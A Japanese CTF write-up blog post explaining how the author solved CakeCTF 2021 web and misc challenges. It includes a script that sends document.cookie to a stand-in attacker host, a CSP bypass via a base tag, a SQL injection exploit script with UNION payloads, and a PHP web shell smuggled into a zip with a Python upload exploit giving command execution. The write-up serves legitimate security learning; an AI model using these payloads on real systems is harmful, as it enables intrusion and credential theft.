---
title: CakeCTF 2021 writeup
thumbnail: /images/2021/20210829-cakectf.png
date: 2021-08-29 23:00:00
tags:
    - CTF
description: CakeCTF 2021 に ./Vespiary で参加して2位でした！解いた問題のwriteupを書きます。
---

CakeCTF 2021 に ./Vespiary で参加して2位でした！

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">2nd place! <a href="https://twitter.com/hashtag/CakeCTF?src=hash&amp;ref_src=twsrc%5Etfw">#CakeCTF</a> 🍰 <a href="https://t.co/72nsBS1VRN">pic.twitter.com/72nsBS1VRN</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1431936049593208833?ref_src=twsrc%5Etfw">August 29, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

以下に解いた問題のwriteupを書いていきます。順番は解いた順です。ziperatopsはチームメンバーと一緒に解きました。

- 公式サイト: https://2021.cakectf.com/
- 公式リポジトリ: https://github.com/theoremoon/cakectf-2021-public

## [web] travelog

196 pts, 22 solves

問題文:
> I'll travel all over the world and make some blog posts here after the pandemic is over.
> Just someone named CSP? is protecting us!

### 解法

ソースコードを見るとどうやらブログを投稿できるサービスのようです。

`show.html`:
```html
    <div class="uk-container">
        {{ post['contents'] | safe }}
    </div>
```
ブログの本文の部分で自明なインジェクションができます。

`app.py`:
```python
@app.after_request
def csp_rule_apply(response):
    if 'csp_nonce' in g:
        policy = ''
        policy += "default-src 'none';"
        policy += f"script-src 'nonce-{g.csp_nonce}' 'unsafe-inline';"
        policy += f"style-src 'nonce-{g.csp_nonce}' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;"
        policy += "frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/;";
        policy += "img-src 'self';"
        policy += "connect-src http: https:;"
        policy += "base-uri 'self'"
        response.headers["Content-Security-Policy"] = policy
    return response
```
ただし、nonceがある場所でしかスクリプトが走らないようになっていてこれを突破する必要があります。

`crawler.js`:
```javascript
const crawl = async (post_url) => {
    if (!post_url.match(/\/post\/[0-9a-f]{32}\/[0-9a-f]{32}$/)) {
        return;
    }
    const url = base_url + post_url;

    const browser = await puppeteer.launch(browser_option);
    try {
        const page = await browser.newPage();
        page.setUserAgent(flag); // [!] steal this flag
        await page.goto(url, {timeout: 3000});
        await wait(3000);
        await page.close();
    } catch(e) { }

    await browser.close();
}
```

とりあえずbotのソースコードを見ると、フラグがUser-Agentに入っていることがわかりました。
適当な攻撃サイトにアクセスさせることができればフラグが手に入りそうです。

というわけで
```html
<meta http-equiv="refresh" content="1;url=http://evil.example.com" />
```
リダイレクトさせます。

### フラグ

```
CakeCTF{CSP_1s_n0t_4_s1lv3r_bull3t!_bang!_bang!}
```
first blood:birthday:でした。
この問題はfirst bloodがprize対象だったので、ﾔｯﾀｰ!

javascriptスキームとmetaタグリダイレクトは便利な小手先テクニックなので毎回チェックしてます。

## [misc] telepathy

173 pts, 29 solves

問題文:
> HTTP is no longer required. It's time to use telepathy to communicate more securely and quickly. Here is my PoC: http://misc.cakectf.com:18100

### 解法

`default.conf`:
```nginx
    location / {
        # I'm getting the flag with telepathy...
        proxy_pass  http://app:8000/;

        # I will send the flag to you by HyperTextTelePathy, instead of HTTP
        header_filter_by_lua_block { ngx.header.content_length = nil; }
        body_filter_by_lua_block { ngx.arg[1] = ngx.re.gsub(ngx.arg[1], "\\w*\\{.*\\}", "I'm sending the flag to you by telepathy... Got it?\n"); }
    }
```

サーバはフラグをレスポンスとして返すのですが、リバースプロキシがフラグをかき消して邪魔をしてきます。
`"\\w*\\{.*\\}"`にマッチしないようにしたいです。

ところでレスポンスのヘッダを見ると`Accept-Ranges: bytes`されていて範囲リクエストが使えるので勝ちです。

```sh
$ http GET "http://misc.cakectf.com:18100/" "Range: bytes=0-25"
HTTP/1.1 206 Partial Content
Accept-Ranges: bytes
Connection: keep-alive
Content-Range: bytes 0-25/28
Content-Type: text/plain; charset=utf-8
Date: Sat, 28 Aug 2021 05:42:50 GMT
Last-Modified: Fri, 27 Aug 2021 03:48:29 GMT
Server: openresty/1.19.3.2
Transfer-Encoding: chunked

CakeCTF{r4ng3-0r4ng3-r4ng3
```

### フラグ

```
CakeCTF{r4ng3-0r4ng3-r4ng3}
```
first blood:birthday:でした。

## [web] travelog again

204 pts, 20 solves

問題文:
> One more travel! :pleading_face:

travelogに作問ミスがあったのでそのリベンジ問題です。

### 解法

`crawler.js`:
```javascript
    const browser = await puppeteer.launch(browser_option);
    try {
        const page = await browser.newPage();
        await page.setCookie({
            "domain":"challenge:8080",
            "name":"flag",
            "value":flag,
            "sameSite":"Strict",
            "httpOnly":false,
            "secure":false
        });
        await page.goto(url, {timeout: 3000});
        await wait(3000);
        await page.close();
    } catch(e) {
        console.log("[-] " + e);
    }
```
travelogと差分を取るとbotのフラグの格納の仕方だけ変わっていました。
リダイレクト戦法が封印されたので、ちゃんとソースコードを読みます。

`show_utils.js`を読み込む場所はこのように記述されています:
```html
<script nonce="{{ csp_nonce }}" src="../../show_utils.js"></script>
```

パスが相対パスなのでここで悪さができそうです。
都合よく`"base-uri 'self'"`が設定されているので相対パスの起点をいじり放題です。

例えば
```
<base href="http://challenge:8080/uploads/ac5b14adfb22f76b3c500747b5a17a0a/x/x/">
```
とすると、`http://challenge:8080/uploads/ac5b14adfb22f76b3c500747b5a17a0a/show_utils.js`を読み込むようになります。

というわけで`show_utils.js`のファイル名のJavaScriptファイルがこの場所に置かれるように配置したいです。ただし、ファイルの投稿はjpegしか許容されていません。

`app.py`:
```python
@app.route('/upload', methods=['POST'])
def upload():
    if 'user_id' not in session:
        abort(404)

    images = request.files.getlist('images[]')
    for f in images:
        with tempfile.NamedTemporaryFile() as t:
            f.save(t.name)
            f.seek(0)
            if imghdr.what(t.name) != 'jpeg':
                abort(400)

    for f in images:
        name = os.path.basename(f.filename)
        if name == '':
            abort(400)
        else:
            f.save(PATH_IMAGE.format(user_id=session['user_id'], name=name))

    return 'OK'
```

つまり、jpegとjsのpolyglotです。
imghdrがどうやってjpegを判定しているのか調査したら
```python
# ref. https://github.com/python/cpython/blob/3.10/Lib/imghdr.py#L37
def test_jpeg(h, f):
    """JPEG data in JFIF or Exif format"""
    if h[6:10] in (b'JFIF', b'Exif'):
        return 'jpeg'
```
とありました。雑すぎて笑いました。

よって次のようなソースコードを`show_utils.js`という名前で投稿すればよいです:
```javascript
//    JFIF
const url = "https://evil.example.com";
setTimeout(() => {
  location = url + "?" + document.cookie;
}, 1000);
```

### フラグ

```
CakeCTF{I'll_n3v3r_trust_HTML:angry:}
```
この問題好き。

## [web] My Nyamber

247 pts, 13 solves

問題文:
> The cat country, Nyapan, started introducing The Social Security and Tax Nyamber System (a.k.a My Nyamber). They also run a bug bounty where you can earn some Matatabi Cat Sticks as reward.

### 解法

`server.js`:
```javascript
/**
 * Find neko by name
 */
async function queryNekoByName(neko_name, callback) {
    let filter = /(\'|\\|\s)/g;
    let result = [];
    if (typeof neko_name === 'string') {
        /* Process single query */
        if (filter.exec(neko_name) === null) {
            try {
                let row = await querySqlStatement(
                    `SELECT * FROM neko WHERE name='${neko_name}'`
                );
                if (row) result.push(row);
            } catch { }
        }
    } else {
        /* Process multiple queries */
        for (let name of neko_name) {
            if (filter.exec(name.toString()) === null) {
                try {
                    let row = await querySqlStatement(
                        `SELECT * FROM neko WHERE name='${name}'`
                    );
                    if (row) result.push(row);
                } catch { }
            }
        }
    }
    callback(result);
}
```
この部分でいかにもSQLiしてくれと言わんばかりのかたちをしています。ただし、`/(\'|\\|\s)/g`のフィルタリングのせいでシングルクォートが使えません。

色々実験したら次のような謎挙動が見つかりました:
```javascript
let filter = /(\'|\\|\s)/g;
["'", "'"].map(name => filter.exec(name))
▶ (2) [Array(2), null]
```

[MDN](https://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_Expressions#using_the_global_search_flag_with_exec)によれば、gフラグのついたRegExpオブジェクトは状態が保持されるようです。知らなかった。

`'OR 1=1 /*` を適当に投げます[^1]:
```sh
$ http GET "http://web.cakectf.com:8002/api/neko?name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*&name[][]='OR%201%3D1%20%2F*"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 156
Content-Type: application/json; charset=utf-8
Date: Sun, 29 Aug 2021 15:53:03 GMT
Keep-Alive: timeout=5
X-Powered-By: Express

{
    "result": [
        {
            "age": 4,
            "name": "Nyanta",
            "nid": 22222222,
            "species": "American Shorthair"
        },
        {
            "age": 4,
            "name": "Nyanta",
            "nid": 22222222,
            "species": "American Shorthair"
        }
    ]
}
```
SQLiできることを確認できました。

[^1]: 実際にはコンテスト中にこの謎挙動の仕様調査はせず、10回くらい同じ文字列を投げれば何個かヒット漏れするでしょという気持ちで、雑にリクエストを投げています。

`exploit.py`:
```python
import httpx
import sys


def req(part, n):
    res = httpx.get(
        "http://web.cakectf.com:8002/api/neko",
        params={
            "name[][]": [part] * n,
        },
    )
    assert res.status_code == 200
    print(res.text)


if __name__ == "__main__":
    req(sys.argv[1], 10)
```

スクリプトを書いてテーブルを漁ります:

```sh
$ python exploit.py "'OR 1=1 UNION SELECT NULL,tbl_name,NULL,NULL FROM sqlite_master /*" | jq
{
  "result": [
    {
      "nid": null,
      "species": "flag",
      "name": null,
      "age": null
    }
  ]
}

$ python exploit.py "'OR 1=1 UNION SELECT NULL,flag,NULL,NULL FROM flag /*" | jq
{
  "result": [
    {
      "nid": null,
      "species": "CakeCTF{BUG-REPORT-ACCEPTED:Reward=222-Matatabi-Sticks}",
      "name": null,
      "age": null
    }
  ]
}
```

### フラグ

```
CakeCTF{BUG-REPORT-ACCEPTED:Reward=222-Matatabi-Sticks}
```

## [web] ziperatops

266 pts, 11 solves

問題文:
> Zip Listing as a Service
> * The flag is written in somewhere on the root directory of the machine.

zipファイルを投稿できて、その中身のファイル名一覧を表示できるサービスが与えられます。

### 解法

```php
        /* Check extension */
        if (preg_match('/^.+\.zip/', $filename, $result) !== 1)
            return array($dname, "Invalid extension (Only .zip is allowed)");
```
まずここの判定で、`'/^.+\.zip$/'`ではなく`'/^.+\.zip/'`で判定しているのがあやしいです。
`a.zip.php`みたいなファイル名も通過します。

うまくすべてのvalidationが通り投稿できた後に、`"temp/$dname/a.zip.php"`にアクセスしたら任意コード実行ができそうです。

ただし、これには3つの壁があります:
1. `$dname`の文字列を奪取する
2. ファイルを投稿後に`cleanup`関数で消されないようにする
3. 投稿したファイルがPHPにzipファイルとして認識される

#### 1. `$dname`の文字列を奪取する

`$dname`の文字列がわからないとファイルのパスがわかりません。ソースコードを眺めるとこの文字列がクライアントに見えそうな部分が一箇所だけあります:
```php
        /* Move the files */
        if (@move_uploaded_file($tmpfile, "temp/$dname/$filename") !== TRUE)
            return array($dname, "Failed to upload the file: $dname/$filename");
```

`move_uploaded_file`をうまく失敗させたいです。これは、めちゃくちゃ長いファイル名にすると保存時にファイルシステムが怒ってくれるので失敗します。

`aaaaaaa{{ ...snip... }}aaaaaaaa.zip`という無限長の名前のファイルを送ればいいです。

#### 2. ファイルを投稿後に`cleanup`関数で消されないようにする

```php
/**
 * Remove a directory and its contents
 */
function cleanup($dname) {
    foreach (glob("temp/$dname/*") as $file) {
        @unlink($file);
    }
    @rmdir("temp/$dname");
}
```
ここで該当ファイルが削除されないようにしたいです。

色々と実験していたら`glob("*")`が隠しファイル（先頭が`.`のファイル）を無視することがわかりました。

#### 3. 投稿したファイルがPHPにzipファイルとして認識される

```php
        /* Check the uploaded zip file */
        $zip = new ZipArchive;
        if ($zip->open($tmpfile) !== TRUE)
            return array($dname, "Invalid file format");
```
ここでzipファイルとしてvalidかどうかを判定しています。
元々PHPコードを投げてRCEをしたかったわけなので、PHPとzipのpolyglotです。

CakeCTFはどこかの鬼畜難易度CTF[^2]ではないので、雑にzipファイルの末尾に`<?php system($_GET["cmd"]); ?>`をつけちゃってもいいんじゃない？という気持ちで試したら突破しました。

[^2]: https://github.com/waderwu/My-CTF-Challenges/blob/master/0ctf-2021/1linephp/writeup/1linephp_writeup_en.md

#### 攻撃

攻撃の準備が整ったのでフラグを取っていきます。

```sh
$ touch x
$ zip a.zip x
  adding: x (stored 0%)
$ echo '<?php system($_GET["cmd"]); ?>' | cat a.zip - > b.zip
```
これで攻撃用のファイル`b.zip`をつくります。

`exploit.py`:
```python
import httpx
import re
import sys

URL = "http://web.cakectf.com:8004/"

if __name__ == "__main__":
    cmd = sys.argv[1]

    files = [
        ("zipfile[]", (".b.zip.php", open("b.zip", "rb"))),
        ("zipfile[]", ("a"*1000 + ".zip", open("b.zip", "rb"))),
    ]

    res = httpx.post(
        URL,
        files=files,
    )
    assert res.status_code == 200

    dname = re.sub(r'^.*\s([0-9a-f]+)/a{1000}.*$', r'\1', res.text, flags=re.DOTALL)

    res = httpx.post(
        f"{URL}/temp/{dname}/.b.zip.php",
        params={
            "cmd": cmd,
        }
    )
    assert res.status_code == 200
    print(res.content)
```

あとはこのスクリプトで好きなコマンドが叩けます。

```sh
$ python exploit.py "ls -la /"
b'PK\x03\x04\n\x00\x00\x00\x00\x00\xd6\xbe\x1eS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1c\x00xUT\t\x00\x034\xf1,a9\xf1,aux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x01\x02\x1e\x03\n\x00\x00\x00\x00\x00\xd6\xbe\x1eS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00xUT\x05\x00\x034\xf1,aux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00G\x00\x00\x00;\x00\x00\x00\x00\x00total 84\ndrwxr-xr-x   1 root root 4096 Aug 30 04:59 .\ndrwxr-xr-x   1 root root 4096 Aug 30 04:59 ..\n-rwxr-xr-x   1 root root    0 Aug 30 04:59 .dockerenv\ndrwxr-xr-x   1 root root 4096 Aug 18 12:33 bin\ndrwxr-xr-x   2 root root 4096 Apr 10 20:15 boot\ndrwxr-xr-x   5 root root  340 Aug 30 04:59 dev\ndrwxr-xr-x   1 root root 4096 Aug 30 04:59 etc\n-r--r--r--   1 root root   56 Aug 30 04:58 flag-5e3981bf788023be6eef57b0ec5512f5.txt\ndrwxr-xr-x   2 root root 4096 Apr 10 20:15 home\ndrwxr-xr-x   1 root root 4096 Aug 18 12:27 lib\ndrwxr-xr-x   2 root root 4096 Aug 16 00:00 lib64\ndrwxr-xr-x   2 root root 4096 Aug 16 00:00 media\ndrwxr-xr-x   2 root root 4096 Aug 16 00:00 mnt\ndrwxr-xr-x   2 root root 4096 Aug 16 00:00 opt\ndr-xr-xr-x 287 root root    0 Aug 30 04:59 proc\ndrwx------   1 root root 4096 Aug 26 21:51 root\ndrwxr-xr-x   1 root root 4096 Aug 18 12:33 run\ndrwxr-xr-x   1 root root 4096 Aug 18 12:33 sbin\ndrwxr-xr-x   2 root root 4096 Aug 16 00:00 srv\ndr-xr-xr-x  13 root root    0 Aug 30 04:59 sys\ndrwxrwxrwt   1 root root 4096 Aug 30 14:57 tmp\ndrwxr-xr-x   1 root root 4096 Aug 16 00:00 usr\ndrwxr-xr-x   1 root root 4096 Aug 18 12:27 var\n'

$ python exploit.py "cat /flag-5e3981bf788023be6eef57b0ec5512f5.txt"
b'PK\x03\x04\n\x00\x00\x00\x00\x00\xd6\xbe\x1eS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1c\x00xUT\t\x00\x034\xf1,a9\xf1,aux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x01\x02\x1e\x03\n\x00\x00\x00\x00\x00\xd6\xbe\x1eS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00xUT\x05\x00\x034\xf1,aux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00G\x00\x00\x00;\x00\x00\x00\x00\x00CakeCTF{uNd3r5t4nd1Ng_4Nd_3xpl01t1Ng_f1l35y5t3m_cf1944}\n'
```

### フラグ

```
CakeCTF{uNd3r5t4nd1Ng_4Nd_3xpl01t1Ng_f1l35y5t3m_cf1944}
```

難しかった。TSGが得意そうな問題だなと思いながら解いた。
このソースコード量（しかも一見セキュアに見える）で解法のステップがたくさんある欲張りな問題。

## 感想

基本的にwebの問題を解いていたのですが、暇な時間が多かったのでcryptoの問題もちらちら見てました。
見てたのはTogether as oneとParty Ticketで結局解けなかった（片方はメンバーが解いた）ですが、どちらもシンプル且つきれいな問題で好きです。こういう問題を解けるようになりたいです。

コンテスト全体に関しては相変わらず運営の人数が3人とは思えないほど、充実した問題数且つ質の高い問題でした。ありがとうございます。
あとウェブサイトのデザインも良かったです。ところでケーキに:birthday:と:cake:の2種類のアイコンがあるの~~ずるい~~いいですね。スコアボードで使い分けていたのが印象的でした。
